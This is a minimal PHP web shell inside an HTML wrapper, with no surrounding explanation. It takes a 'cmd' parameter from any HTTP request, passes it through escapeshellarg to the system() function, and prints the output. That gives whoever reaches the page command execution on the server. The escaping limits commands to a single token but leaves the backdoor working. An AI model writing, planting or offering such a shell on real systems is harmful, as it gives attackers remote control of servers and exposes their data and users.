<html>
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = escapeshellarg($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
</html>

